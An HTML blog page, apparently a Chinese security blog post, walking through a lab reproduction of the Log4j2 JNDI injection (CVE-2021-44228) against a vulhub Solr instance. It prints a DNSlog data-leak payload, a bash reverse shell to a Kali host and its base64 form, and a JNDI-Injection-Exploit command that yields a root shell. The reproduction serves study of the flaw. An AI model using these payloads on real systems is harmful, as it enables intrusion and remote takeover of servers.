@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="𝐴_𝑌𝑢">
+
+
+
+
+
+<title>log4j2复现 | 𝓐_𝚼𝓾ʹ𝒔 𝓑ℓ𝖔𝓰</title>
+
+
+
+    <link rel="icon" href="/image/favicon.svg">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1614813_fp9wxdcpr9c.css"
+<meta name="generator" content="Hexo 6.1.0"></head>
+<body>
+    <div class="wrapper">
+        <link rel="stylesheet" href="../fonts/iconfont2/iconfont.css"> 
+
+<header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/"><i class="iconfont icon-zhuye"></i>主页</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">
+                        
+                            <i class="iconfont icon-archives "></i>
+                        
+                        
+                        
+                        
+                        文章
+                    </a>
+                
+                    <a class="menu-item" href="/category">
+                        
+                        
+                            <i class="iconfont icon-categorys "></i>
+                        
+                        
+                        
+                        分类
+                    </a>
+                
+                    <a class="menu-item" href="/tag">
+                        
+                        
+                        
+                            <i class="iconfont icon-tags "></i>
+                        
+                        
+                        标签
+                    </a>
+                
+                    <a class="menu-item" href="/link">
+                        
+                        
+                        
+                        
+                            <i class="iconfont icon-link "></i>
+                        
+                        链接
+                    </a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">主页</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; 菜单</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">
+                        
+                            <i class="iconfont icon-archives "></i>
+                        
+                        
+                        
+                        
+                        文章
+                    </a>
+                
+                    <a class="menu-item" href="/category">
+                        
+                        
+                            <i class="iconfont icon-categorys "></i>
+                        
+                        
+                        
+                        分类
+                    </a>
+                
+                    <a class="menu-item" href="/tag">
+                        
+                        
+                        
+                            <i class="iconfont icon-tags "></i>
+                        
+                        
+                        标签
+                    </a>
+                
+                    <a class="menu-item" href="/link">
+                        
+                        
+                        
+                        
+                        链接
+                    </a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">▶︎ 展开目录</a>
+    </div>
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a onclick="go_top()">△ 顶部</a>
+        <a onclick="go_bottom()">▽ 底部</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "▼ 收起目录"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "▶︎ 展开目录"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">log4j2复现</h1>
+            
+                <div class="post-meta">
+                    
+                        <!--作者:-->
+                        <i class="iconfont icon-user"></i>
+                        <a itemprop="author" rel="author" href="/">𝐴_𝑌𝑢 </a> &nbsp;
+                    
+
+                    
+                        <span class="post-time">
+                        <!--发布时间:-->
+                        <i class="iconfont icon-time"></i>
+                        <a href="#">2022-07-17&nbsp;&nbsp;11:41:28</a> &nbsp;
+                        </span>
+                    
+                    
+                    
+                    <span id="/2022/07/17/22-0717-01/" class="leancloud-visitors view" data-flag-title="log4j2复现">
+                        <text class="post-meta-item-text">
+                            <!--阅读数:-->
+                            <i class="iconfont icon-view"></i>
+                        </text>
+                        
+                        <text class="leancloud-visitors-count">加载中</text>
+                      </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <blockquote>
+<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46145027/article/details/124661480">https://blog.csdn.net/qq_46145027/article/details/124661480</a></p>
+</blockquote>
+<h1 id="log4j2介绍："><a href="#log4j2介绍：" class="headerlink" title="log4j2介绍："></a>log4j2介绍：</h1><p>log4j2是Apache的一个java日志框架，可以借助它进行日志相关操作管理，当我们使用log4j2提供的方法去输出日志时，比如最常见的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String a = &quot;变量输入&quot; </span><br><span class="line">LOGGER.info(&quot;日志信息:&#123;&#125;&quot;,a);</span><br></pre></td></tr></table></figure>
+
+<p>我们通过这样的语句输出了一句日志信息，其中{}的部分由我们传进去的变量决定，当然一般我们传进去的都是一些很普通的语句，所以不会出什么问题。但如果我们往里面传一些别的代码呢，比如传一个${java.os}这样的语句，执行后可以看到：</p>
+<img src="/2022/07/17/22-0717-01/image-20220717115303762.png" alt="image-20220717115303762" style="zoom:80%;">
+
+<p>可以看到它执行了java.os的内容把我们操作系统的信息显示出来了，看到这里很多人立马想到：这里可能会存在注入攻击，类似我们熟悉的XSS注入、SQL注入等等。当然这里输入的信息因为是日志的信息，用户是看不到的，所以显示了也没啥影响，但是实际上这里是存在着JNID注入的。</p>
+<h1 id="JNDI注入简单介绍"><a href="#JNDI注入简单介绍" class="headerlink" title="JNDI注入简单介绍"></a>JNDI注入简单介绍</h1><p>JNDI，中文名叫java命名和目录接口，它为我们提供了命名和目录服务，具体就不多讲了。主要是JNDI其中有一个lookup()方法，这是一个查找方法，上面代码执行结果也正是因为log4j2在获取到${}这样的格式的时候会自动的去调用lookup()方法。而这个方法的可怕之处就在于，它可以远程加载对象，比如我们传一个类似如下的参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lookup(&quot;rmi://127.0.0.1/test&quot;)</span><br><span class="line">lookup(&quot;ldap://127.0.0.1/test&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>这样的参数进去，它（黑客）就可以远程访问到我们本地的类，那如果这些类里面有恶意代码的话造成的危害显然是非常严重的。</p>
+<h1 id="log4j2复现"><a href="#log4j2复现" class="headerlink" title="log4j2复现"></a>log4j2复现</h1><h2 id="CVE-2021-44228"><a href="#CVE-2021-44228" class="headerlink" title="CVE-2021-44228"></a>CVE-2021-44228</h2><p>复现的环境采用vulhub，搭建完成后，访问环境如下：</p>
+<img src="/2022/07/17/22-0717-01/image-20220717120824470.png" alt="image-20220717120824470" style="zoom:80%;">
+
+<p>然后发现<code>http://192.168.49.100:8983/solr/admin/cores?action=</code>路径下存在注入，如下：</p>
+<img src="/2022/07/17/22-0717-01/1.gif" alt="1" style="zoom:80%;">
+
+<p>然后首先在dnslog.cn获取一个域名来监控我们的注入效果</p>
+<img src="/2022/07/17/22-0717-01/image-20220717121751016.png" alt="image-20220717121751016" style="zoom:80%;">
+
+<p>然后按照上面的原理构造payload，如下payload回显java的版本号</p>
+<p><code>http://192.168.49.100:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.9ywltd.dnslog.cn&#125;</code></p>
+<img src="/2022/07/17/22-0717-01/image-20220717122652747.png" alt="image-20220717122652747" style="zoom:80%;">
+
+<p>java的版本号如下：</p>
+<img src="/2022/07/17/22-0717-01/image-20220717122847592.png" alt="image-20220717122847592" style="zoom:80%;">
+
+<p>但是如果仅仅是用来读取java的版本号就太鸡肋了，我们需要利用该命令进行命令执行</p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>需要用到github上的一个工具<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0">JNDI-Injection-Exploit v1.0</a></p>
+<p>然后开始构造反弹shell用到的命令，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.49.84/6666 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">注意：192.168.49.84是kali的ip</span><br></pre></td></tr></table></figure>
+
+<p>由于反弹shell需要经过base64编码，所以对上面命令进行base64编码，编码后如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjEwMC82NjY2IDA+JjE=</span><br></pre></td></tr></table></figure>
+
+<p>然后构造payload，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5Ljg0LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;192.168.49.84&quot; </span><br><span class="line"></span><br><span class="line">注意：-C后面的参数是要执行的命令以及编码方式，-A后面是你vps的ip</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/07/17/22-0717-01/image-20220717131455550.png" alt="image-20220717131455550" style="zoom:80%;">
+
+<p>我们可以看到有三个服务，看到了rmi和ldap，实际这个JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar就是帮助我们生成了一个恶意的类，并且生成了对应的URL，然后我们就可以回到之前的网站进行JNDI注入：</p>
+<p>在注入之前先监听kali的6666端口</p>
+<img src="/2022/07/17/22-0717-01/image-20220717131740848.png" alt="image-20220717131740848" style="zoom:80%;">
+
+<p>然后进行jndi注入</p>
+<img src="/2022/07/17/22-0717-01/image-20220717131841065.png" alt="image-20220717131841065" style="zoom:80%;">
+
+<p>然后我们看到网页被重定向到了我们的恶意类地址，如下：</p>
+<img src="/2022/07/17/22-0717-01/image-20220717132041429.png" alt="image-20220717132041429" style="zoom:80%;">
+
+<p>并且反弹shell成功，是root权限</p>
+<img src="/2022/07/17/22-0717-01/image-20220717131934482.png" alt="image-20220717131934482" style="zoom:80%;">
+
+        </div>		
+		
+        <section class="post-tags">
+            <div>
+                <span>标签:</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="/">
+                    <i class="iconfont icon-home"></i>
+                    主页
+                </a>
+                <span>· </span>
+                <a href="javascript:window.history.back();">
+                    <i class="iconfont icon-back"></i>
+                    返回
+                </a>
+                
+                
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/07/17/22-0717-02/">fastjson漏洞复现</a>
+            
+            
+            <a class="next" rel="next" href="/2022/07/08/22-0708-01/">sqlmap测试工具使用指南</a>
+            
+        </section>
+        <br>
+        
+            <section id="comments" class="comments">
+              <style>
+                  .comments{ margin-top: 30px;}
+                  .v .vlist .vcard .vcontent {padding-top: 0;}
+                  .vcontent p { color:grey; margin-bottom: 10px;}
+                  .v * {line-height: normal;}
+                  .v .vwrap  {border-radius: 0px; padding: 10px;}
+                  .v .vbtn {border-radius: 0px;}
+                  .v code, .v pre {border-radius: 0px;}
+                  .v .vlist .vcard .vhead .vsys {border-radius: 1px; padding: 2px;}
+                  .v .vlist .vcard .vhead .vnick {color: #2d96bd;}
+                  .v .vlist .vcard .vh .vmeta .vat{color: #c7254e;}
+                  .v .vlist .vcard {padding-top: 0;}
+                  .v .vlist .vcard .vimg { width: 2.5em; height: 2.5em; }
+                  .v .vlist .vcard .vquote .vimg { width: 2.5em; height: 2.5em; }
+              </style>
+              <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+    new Valine({
+        app_id: 'baahrwTTyOayDYUv5AtkdGJj-gzGzoHsz',
+        app_key: 'iTfzn8X60g9v0zTtnvToc09l',
+        placeholder: '想对作者说点什么...',
+        notify: 'false',
+        verify: 'false',
+        avatar: 'retro',
+        visitor: 'true'
+    });
+</script>
+            </section>
+        
+    </article>
+</div>
+
+
+
+<style>
+
+.post-wrap { table-layout:fixed; word-break:break-all; overflow:hidden; }
+
+</style>
+        </div>
+        <footer id="footer" class="footer">
+
+ <div class="copyright">
+
+ <span>© 𝐴_𝑌𝑢
+
+ <!-- 访客数量 -->
+
+ 
+
+ <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    | 总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    | 总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></i>
+</span>
+
+
+ 
+
+ </span>
+
+ </div>
+
+</footer>
+    </div>
+</body>
+</html>
+
+
+	
+
+
+
+<script type="text/javascript" src="\js\jquery.js"></script>
+<script type="text/javascript" src="\js\jquery.min.js"></script>
+
+<script  type="text/javascript" src="\js\snow.js"></script>
+
